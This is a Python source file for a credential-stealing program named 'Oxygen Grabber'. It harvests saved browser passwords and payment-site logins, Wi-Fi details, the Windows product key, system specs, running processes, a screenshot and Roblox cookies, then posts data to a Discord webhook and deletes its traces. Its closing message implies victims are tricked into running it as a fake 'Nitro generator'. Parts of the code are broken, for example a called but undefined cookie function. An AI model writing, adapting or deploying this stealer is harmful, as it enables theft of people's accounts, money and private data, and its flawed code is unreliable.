import requests
import os
import shutil
import subprocess
import pychromepass
import pyautogui
import pywifi
import psutil
import wmi
import getpass
import time
import pygetwindow as gw

# Define flags to control data collection
collect_product_key = True
collect_browser_login_details = True
collect_browser_card_details = True
collect_wifi_networks = True
collect_pc_specs = True
collect_running_apps = True
collect_screenshot = True
collect_microsoft_info = True
collect_roblox_info = True

# Define the Discord webhook URL
webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'

# Function to retrieve product key (Windows only)
def get_windows_product_key():
    if not collect_product_key:
        return None
    try:
        result = subprocess.run(['wmic', 'path', 'SoftwareLicensingService', 'get', 'OA3xOriginalProductKey'], capture_output=True, text=True)
        product_key = result.stdout.strip().split('\n')[1]
        return product_key
    except Exception as e:
        print("Error retrieving product key:", e)
        return None

# Function to retrieve login details from browsers
def get_browser_login_details():
    if not collect_browser_login_details:
        return None
    try:
        login_details = []
        browsers = ['Chrome', 'Edge', 'Brave', 'Firefox', 'Opera GX']
        for browser in browsers:
            passwords = pychromepass.get_passwords(browser)
            for entry in passwords:
                login_details.append(f"|{browser}|{entry['url']}|{entry['username']}|{entry['password']}|")
        return '\n'.join(login_details)
    except Exception as e:
        print("Error retrieving login details from browsers:", e)
        return None

# Function to retrieve card details from browsers
def get_browser_card_details():
    if not collect_browser_card_details:
        return None
    try:
        card_details = []
        browsers = ['Chrome', 'Edge', 'Brave', 'Firefox', 'Opera GX']
        for browser in browsers:
            passwords = pychromepass.get_passwords(browser)
            for entry in passwords:
                if 'card' in entry['url'].lower() or 'payment' in entry['url'].lower():
                    card_details.append(f"|{browser}|{entry['url']}|{entry['username']}|{entry['password']}|")
        return '\n'.join(card_details)
    except Exception as e:
        print("Error retrieving card details from browsers:", e)
        return None

# Function to retrieve saved Wi-Fi networks with passwords
def get_wifi_networks():
    if not collect_wifi_networks:
        return None
    try:
        wifi = pywifi.PyWiFi()
        interfaces = wifi.interfaces()[0]
        networks = interfaces.scan_results()
        wifi_networks = []
        for network in networks:
            wifi_networks.append(f"SSID: {network.ssid}, Password: {network.akm.get('PASSWORD')}")
        return '\n'.join(wifi_networks)
    except Exception as e:
        print("Error retrieving Wi-Fi networks with passwords:", e)
        return None

# Function to retrieve PC specs.
def get_pc_specs():
    if not collect_pc_specs:
        return None
    try:
        pc_specs = {}
        computer = wmi.WMI()
        
        # Get operating system information
        os_info = computer.Win32_OperatingSystem()[0]
        pc_specs['OS Name'] = os_info.Name
        pc_specs['Windows Product Key'] = get_windows_product_key()
        
        # Get processor information
        processor_info = computer.Win32_Processor()[0]
        pc_specs['Processor'] = processor_info.Name
        
        # Get memory information
        memory_info = computer.Win32_PhysicalMemory()
        total_memory = sum(int(memory.Capacity) for memory in memory_info)
        pc_specs['Total Memory (RAM)'] = f"{total_memory // (1024 ** 3)} GB"
        
        # Get disk information
        disk_info = computer.Win32_LogicalDisk()
        for disk in disk_info:
            if disk.DriveType == 3:  # DriveType 3 represents a local disk
                pc_specs['Disk'] = f"{disk.Caption} ({disk.FileSystem}), {disk.Size // (1024 ** 3)} GB total"
                break
        
        return pc_specs
    except Exception as e:
        print("Error retrieving PC specifications:", e)
        return None

# Function to retrieve running applications from Task Manager
def get_running_applications():
    if not collect_running_apps:
        return None
    try:
        running_apps = []
        for proc in psutil.process_iter(['name']):
            running_apps.append(proc.info['name'])
        return '\n'.join(running_apps)
    except Exception as e:
        print("Error retrieving running applications:", e)
        return None

# Function to take screenshot
def take_screenshot():
    if not collect_screenshot:
        return None
    try:
        screenshot_path = 'oxygentookascreenshot.png'
        pyautogui.screenshot(screenshot_path)
        return screenshot_path
    except Exception as e:
        print("Error taking screenshot:", e)
        return None

# Function to retrieve Microsoft email and points from the logged-in session
def get_microsoft_info():
    if not collect_microsoft_info:
        return None, None
    try:
        # Locate browser window with Microsoft account logged in
        microsoft_window = None
        for window in gw.getWindowsWithTitle('Microsoft'):
            if window.isMaximized:
                microsoft_window = window
                break
        
        if microsoft_window:
            # Extract email and points from the window title
            window_title = microsoft_window.title
            email = window_title.split('-')[0].strip()
            points = window_title.split('-')[1].strip()
            return email, points
        else:
            print("Microsoft account window not found.")
            return None, None
    except Exception as e:
        print("Error retrieving Microsoft email and points:", e)
        return None, None

# Function to save collected information to folders
def save_info_to_folders(product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot, roblox_cookies):
    try:
        folder_path = 'recovered-info'
        os.makedirs(folder_path, exist_ok=True)
        
        # Save product key
        with open(os.path.join(folder_path, 'PC info-Specs.txt'), 'w') as f:
            f.write("Your Name: " + getpass.getuser() + "\n")
            f.write("Microsoft Email: [unavailable]\n")
            f.write("Microsoft Rewards Points: [unavailable]\n\n")
            f.write("Product Key: " + str(product_key) + "\n")
            for key, value in pc_specs.items():
                f.write(key + ": " + str(value) + "\n")
            f.write("\nRunning Applications:\n" + str(running_apps))
        
        # Save login details
        with open(os.path.join(folder_path, 'logins.txt'), 'w') as f:
            f.write(login_details)
        
        # Save card details
        with open(os.path.join(folder_path, 'bank info.txt'), 'w') as f:
            f.write(card_details)
        
        # Save Wi-Fi networks
        with open(os.path.join(folder_path, 'Wi-Fi.txt'), 'w') as f:
            f.write(wifi_networks)
        
        # Save Roblox cookies
        with open(os.path.join(folder_path, 'roblox_cookies.txt'), 'w') as f:
            f.write(roblox_cookies)
        
        # Save screenshot
        shutil.copy(screenshot, folder_path)
        
        print("Information saved to 'recovered-info' folder.")
    except Exception as e:
        print("Error saving information to folders:", e)

# Function to send data to Discord webhook
def send_to_discord_webhook():
    try:
        folder_path = 'recovered-info'
        screenshot_path = os.path.join(folder_path, 'oxygentookascreenshot.png')
        files = {'file': open(screenshot_path, 'rb')}
        response = requests.post(webhook_url, files=files)
        print("Data sent to Discord:", response.text)
        
        # If data sent successfully, delete the folder
        if response.status_code == 200:
            shutil.rmtree(folder_path)  # Delete the folder
            print("Folder deleted successfully.")
        else:
            print("Data sent to Discord, but folder deletion failed.")
    except Exception as e:
        print("Error sending data to Discord:", e)

if __name__ == "__main__":
    # Collecting system information
    product_key = get_windows_product_key()
    login_details = get_browser_login_details()
    card_details = get_browser_card_details()
    wifi_networks = get_wifi_networks()
    pc_specs = get_pc_specs()
    running_apps = get_running_applications()
    screenshot = take_screenshot()
    microsoft_email, microsoft_points = get_microsoft_info()
    
    # Check if any data is collected
    if any([product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot]):
        # Get Roblox cookies
        roblox_cookies = get_roblox_cookies() if collect_roblox_info else None
        
        # Save collected information
        save_info_to_folders(product_key, login_details, card_details, wifi_networks, pc_specs, running_apps, screenshot, roblox_cookies)
        
        # Send data to Discord webhook
        send_to_discord_webhook()
    else:
        print("No data collected.")

# Security alert
name = getpass.getuser()
print(f"Hey {name}, your info has been logged by Oxygen Grabber. If someone had told you to install this saying it’s a Nitro generator or something, head to notes.com/here to get help.")
